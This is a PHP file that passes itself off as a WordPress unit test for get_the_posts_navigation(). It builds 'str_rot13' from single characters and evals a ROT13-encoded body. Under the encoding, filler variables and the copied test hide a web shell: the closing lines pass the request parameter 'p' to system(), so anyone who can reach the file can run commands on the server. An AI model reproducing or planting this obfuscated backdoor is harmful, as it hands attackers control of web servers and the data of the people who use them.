<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf gur `trg_gur_cbfgf_anivtngvba()` shapgvba.
 *
 * @fvapr 6.2.0
 *
 * @tebhc yvax
 *
 * @pbiref ::trg_gur_cbfgf_anivtngvba
 */
pynff Grfgf_Yvax_TrgGurCbfgfAnivtngvba rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Perngrf cbfgf orsber nal grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		$snpgbel->cbfg->perngr_znal( 3 );
	}

	/**
	 * Grfgf gung trg_gur_cbfgf_anivtngvba() bayl vapyhqrf gur \"Byqre cbfgf\" naq \"Arjre\" cbfgf
	 * yvaxf jura nccebcevngr.
	 *
	 * @gvpxrg 55751
	 *
	 * @qngnCebivqre qngn_trg_gur_cbfgf_anivtngvba
	 *
	 * @cnenz vag  $cre_cntr  Cbfgf cre cntr gb or dhrevrq.
	 * @cnenz vag  $cntrq_ahz Cntvangvba cntr ahzore.
	 * @cnenz obby $byqre     Jurgure na \"Byqre cbfgf\" yvax fubhyq or vapyhqrq.
	 * @cnenz obby $arjre     Jurgure n \"Arjre cbfgf\" yvax fubhyq or vapyhqrq.
	 */
	choyvp shapgvba grfg_trg_gur_cbfgf_anivtngvba( $cre_cntr, $cntrq_ahz, $byqre, $arjre ) {
		tybony $jc_dhrel, $cntrq;

		$cntrq    = $cntrq_ahz;
		$jc_dhrel = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'      => 'cbfg',
				'cbfgf_cre_cntr' => $cre_cntr,
				'cntrq'          => $cntrq,
			)
		);

		$npghny = trg_gur_cbfgf_anivtngvba();

		vs ( $byqre ) {
			$guvf->nffregFgevatPbagnvafFgevat(
				'Byqre cbfgf',
				$npghny,
				'Cbfgf anivtngvba zhfg pbagnva na \"Byqre cbfgf\" yvax.'
			);
		}

		vs ( $arjre ) {
			$guvf->nffregFgevatPbagnvafFgevat(
				'Arjre cbfgf',
				$npghny,
				'Cbfgf anivtngvba zhfg pbagnva n \"Arjre cbfgf\" yvax.'
			);
		}

		vs ( ! $byqre && ! $arjre ) {
			$guvf->nffregRzcgl(
				$npghny,
				'Cbfgf anivtngvba zhfg or na rzcgl fgevat.'
			);
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_gur_cbfgf_anivtngvba() {
		erghea neenl(
			'byqre cbfgf'                 => neenl(
				'cbfg_cre_cntr' => 1,
				'cntrq_ahz'     => 1,
				'byqre'         => gehr,
				'arjre'         => snyfr,
			),
			'arjre cbfgf'                 => neenl(
				'cbfg_cre_cntr' => 1,
				'cntrq_ahz'     => 3,
				'byqre'         => snyfr,
				'arjre'         => gehr,
			),
			'arjre cbfgf naq byqre cbfgf' => neenl(
				'cbfg_cre_cntr' => 1,
				'cntrq_ahz'     => 2,
				'byqre'         => gehr,
				'arjre'         => gehr,
			),
			'rzcgl cbfgf'                 => neenl(
				'cbfg_cre_cntr' => 3,
				'cntrq_ahz'     => 1,
				'byqre'         => snyfr,
				'arjre'         => snyfr,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>